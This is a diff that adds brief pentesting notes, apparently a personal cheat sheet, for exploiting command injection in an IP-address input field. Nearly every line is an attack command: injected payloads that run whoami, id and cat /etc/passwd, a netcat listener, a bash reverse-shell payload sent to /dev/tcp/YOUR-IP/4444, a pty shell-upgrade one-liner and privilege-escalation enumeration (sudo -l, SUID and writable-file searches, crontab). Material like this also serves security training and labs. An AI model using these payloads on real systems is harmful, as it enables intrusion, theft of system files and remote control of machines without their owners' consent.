@@ -1,0 +1,56 @@
+Command Injection
+
+127.0.0.1; whoami
+
+127.0.0.1 && whoami
+
+127.0.0.1 | whoami
+
+127.0.0.1; id
+
+127.0.0.1; cat /etc/passwd
+
+127.0.0.1; ls
+
+127.0.0.1; pwd
+
+Start Listener in Terminal
+
+nc -lvnp 4444
+
+nc - Netcat
+
+l → listen
+v → verbose
+n → no DNS
+p → port
+
+Payload
+
+127.0.0.1; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
+
+Once we got the shell use this cmd to stablise
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Try DB login
+
+mysql -u root -p
+
+To Check what cmd can i able to run with sudo Permission
+
+sudo -l
+
+It searches for files with SUID permission.
+
+find / -perm -4000 2>/dev/null
+
+Writable Files / Scripts
+
+find / -writable 2>/dev/null | head
+
+Shows files you can modify as www-data.
+
+Cron Jobs (Scheduled tasks)
+
+cat /etc/crontab
